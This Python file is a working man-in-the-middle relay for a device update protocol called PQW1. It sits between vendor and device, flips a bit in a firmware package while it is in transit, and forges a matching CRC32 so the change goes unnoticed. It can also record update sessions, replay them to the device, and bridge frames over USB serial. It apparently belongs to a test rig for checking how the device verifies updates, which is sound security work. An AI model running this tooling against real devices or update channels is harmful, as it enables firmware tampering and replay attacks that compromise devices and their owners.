#!/usr/bin/env python3
"""
On-path relay for PQW1 over TCP: the attacker's laptop between the vendor and
the device. It understands the frames well enough to tamper with a package in
flight, to record the traffic, and to replay a recording. It holds no keys.

  relay.py tcp-proxy --listen PORT --target HOST:PORT [--flip OFFSET] [--record DIR]
  relay.py replay --target HOST:PORT --file RECORDING

--flip OFFSET   flip one bit of the package byte at OFFSET (counted from the
                start of the package) as the chunk carrying it passes
--record DIR    write each package seen to DIR/package-N.bin and the raw
                client-to-device stream to DIR/stream-N.pqw1

As a library: Relay(listen_port, target, flip=None, record_dir=None).start().
"""

import argparse
import os
import socket
import struct
import sys
import threading
import time
import zlib

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "vendor"))
import vendor_lib as vl  # noqa: E402


class Relay:
    def __init__(self, listen_port, target, flip=None, record_dir=None, host="127.0.0.1"):
        self.target = target
        self.flip = flip
        self.record_dir = record_dir
        self.srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind((host, listen_port))
        self.srv.listen(4)
        self.port = self.srv.getsockname()[1]
        self.count = 0
        self.packages = []
        self.stop = False
        self.flipped = 0
        if record_dir:
            os.makedirs(record_dir, exist_ok=True)

    def start(self):
        t = threading.Thread(target=self._accept, daemon=True)
        t.start()
        return self

    def close(self):
        self.stop = True
        try:
            self.srv.close()
        except OSError:
            pass

    def _accept(self):
        while not self.stop:
            try:
                c, _ = self.srv.accept()
            except OSError:
                return
            self.count += 1
            threading.Thread(target=self._session, args=(c, self.count), daemon=True).start()

    def _session(self, client, n):
        try:
            dev = socket.create_connection(self.target, timeout=10)
        except OSError:
            client.close()
            return
        state = {"pkg": bytearray(), "stream": bytearray()}
        t = threading.Thread(target=self._pump_back, args=(dev, client), daemon=True)
        t.start()
        buf = b""
        try:
            while True:
                data = client.recv(65536)
                if not data:
                    break
                buf += data
                while True:
                    frame, buf = self._take(buf)
                    if frame is None:
                        break
                    out = self._handle(frame, state)
                    state["stream"] += out
                    dev.sendall(out)
        except OSError:
            pass
        finally:
            if self.record_dir and state["pkg"]:
                with open(os.path.join(self.record_dir, f"package-{n}.bin"), "wb") as f:
                    f.write(state["pkg"])
            if self.record_dir and state["stream"]:
                with open(os.path.join(self.record_dir, f"stream-{n}.pqw1"), "wb") as f:
                    f.write(state["stream"])
            if state["pkg"]:
                self.packages.append(bytes(state["pkg"]))
            for s in (dev, client):
                try:
                    s.close()
                except OSError:
                    pass

    @staticmethod
    def _take(buf):
        """Split one whole frame off the front of buf. Unknown bytes pass through as 1-byte frames."""
        if len(buf) < 4:
            return None, buf
        if buf[:4] != vl.MAGIC:
            return buf[:1], buf[1:]
        if len(buf) < 12:
            return None, buf
        (length,) = struct.unpack("<I", buf[8:12])
        total = 12 + length + 4
        if length > vl.MAX_PAYLOAD:
            return buf[:1], buf[1:]
        if len(buf) < total:
            return None, buf
        return buf[:total], buf[total:]

    def _handle(self, frame, state):
        if len(frame) < 16 or frame[:4] != vl.MAGIC:
            return frame
        ftype = frame[4]
        payload = frame[12:-4]
        if ftype == vl.PKG_BEGIN:
            state["pkg"] = bytearray()
            if self.flip is not None and len(payload) == 8:
                total, claim = struct.unpack("<II", payload)
                if self.flip < total:
                    # CRC32 is affine, so the claim for the altered package follows from the
                    # flip alone: crc(m ^ e) = crc(m) ^ crc(e) ^ crc(0). A transport CRC stops
                    # nobody on the path.
                    e = bytearray(total)
                    e[self.flip] = 0x01
                    claim ^= zlib.crc32(bytes(e)) ^ zlib.crc32(bytes(total))
                    return vl.encode_frame(ftype, struct.unpack("<H", frame[6:8])[0],
                                           struct.pack("<II", total, claim), frame[5])
        elif ftype == vl.PKG_CHUNK and len(payload) >= 4:
            (off,) = struct.unpack("<I", payload[:4])
            data = bytearray(payload[4:])
            if self.flip is not None and off <= self.flip < off + len(data):
                data[self.flip - off] ^= 0x01
                self.flipped += 1
            if len(state["pkg"]) < off + len(data):
                state["pkg"].extend(b"\0" * (off + len(data) - len(state["pkg"])))
            state["pkg"][off:off + len(data)] = data
            # the sender's CRC covers the original; an on-path attacker fixes up the transport CRC
            return vl.encode_frame(ftype, struct.unpack("<H", frame[6:8])[0], payload[:4] + bytes(data), frame[5])
        return frame

    @staticmethod
    def _pump_back(dev, client):
        try:
            while True:
                data = dev.recv(65536)
                if not data:
                    break
                client.sendall(data)
        except OSError:
            pass
        finally:
            for s in (dev, client):
                try:
                    s.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass


def b64line(frame):
    import base64
    return b"@" + base64.b64encode(frame) + b"\n"


def unb64line(line):
    import base64
    line = line.strip()
    if not line.startswith(b"@"):
        return None
    try:
        return base64.b64decode(line[1:], validate=True)
    except ValueError:
        return None


class UsbBridge:
    """TCP server whose frames travel over a USB serial line to the board.

    `ser` needs read(n) returning bytes (possibly empty) and write(bytes). Each frame is
    one "@<base64>" line; other lines are diagnostics and are dropped.
    """

    def __init__(self, ser, listen_port=0, host="127.0.0.1"):
        self.ser = ser
        self.srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind((host, listen_port))
        self.srv.listen(2)
        self.port = self.srv.getsockname()[1]
        self.client = None
        self.stop = False
        self.lock = threading.Lock()

    def start(self):
        threading.Thread(target=self._accept, daemon=True).start()
        threading.Thread(target=self._from_serial, daemon=True).start()
        return self

    def close(self):
        self.stop = True
        self.srv.close()

    def _accept(self):
        while not self.stop:
            try:
                c, _ = self.srv.accept()
            except OSError:
                return
            with self.lock:
                self.client = c
            threading.Thread(target=self._from_tcp, args=(c,), daemon=True).start()

    def _from_tcp(self, c):
        buf = b""
        try:
            while True:
                data = c.recv(65536)
                if not data:
                    return
                buf += data
                while True:
                    frame, buf = Relay._take(buf)
                    if frame is None:
                        break
                    if len(frame) >= 16:
                        self.ser.write(b64line(frame))
        except OSError:
            pass

    def _from_serial(self):
        buf = b""
        while not self.stop:
            chunk = self.ser.read(4096)
            if not chunk:
                time.sleep(0.01)
                continue
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                frame = unb64line(line)
                with self.lock:
                    c = self.client
                if frame and c:
                    try:
                        c.sendall(frame)
                    except OSError:
                        pass


def replay(target, stream):
    """Send a recorded client-to-device stream to the device; return the frames that came back."""
    s = socket.create_connection(target, timeout=10)
    s.sendall(stream)
    out = []
    end = time.time() + 5
    while time.time() < end:
        try:
            fr = vl.read_frame(s, 1.0)
        except OSError:
            break
        if fr is None:
            break
        out.append(fr)
    s.close()
    return out


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)
    p = sub.add_parser("tcp-proxy")
    p.add_argument("--listen", type=int, default=7100)
    p.add_argument("--target", required=True)
    p.add_argument("--flip", type=int)
    p.add_argument("--record")
    u = sub.add_parser("usb")
    u.add_argument("--serial", required=True)
    u.add_argument("--listen", type=int, default=7000)
    r = sub.add_parser("replay")
    r.add_argument("--target", required=True)
    r.add_argument("--file", required=True)
    a = ap.parse_args()

    if a.cmd == "usb":
        import serial
        ser = serial.Serial(a.serial, 115200, timeout=0.05)
        br = UsbBridge(ser, a.listen, host="0.0.0.0").start()
        print(f"usb relay on :{br.port} <-> {a.serial}", flush=True)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            br.close()
        return
    host, port = a.target.rsplit(":", 1)
    if a.cmd == "tcp-proxy":
        rel = Relay(a.listen, (host, int(port)), a.flip, a.record, host="0.0.0.0").start()
        print(f"relay on :{rel.port} -> {a.target}", flush=True)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            rel.close()
    else:
        frames = replay((host, int(port)), open(a.file, "rb").read())
        for ftype, seq, payload in frames:
            print(f"type=0x{ftype:02x} seq={seq} len={len(payload)}")


if __name__ == "__main__":
    main()
